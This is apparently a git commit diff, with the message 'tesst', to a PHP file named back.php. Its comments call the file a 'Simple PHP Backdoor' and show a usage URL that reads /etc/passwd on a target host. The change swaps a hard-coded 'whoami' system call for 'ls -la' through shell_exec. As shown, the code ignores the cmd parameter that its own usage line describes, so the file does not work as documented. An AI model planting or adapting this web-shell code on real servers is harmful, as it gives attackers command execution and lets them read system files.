cbfc5257266d8bc53ae73aa8640ddd256d2a8dfe
Void <51586851+Val0id@users.noreply.github.com>
2023-02-07 01:43:34 +0700

    tesst

--- back.php
+++ back.php
@@ -1,5 +1,5 @@
 <!-- Simple PHP Backdoor By DK (One-Liner Version) -->
 <!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
 <?php
-echo system("whoami");
+echo shell_exec("ls -la");
 ?>
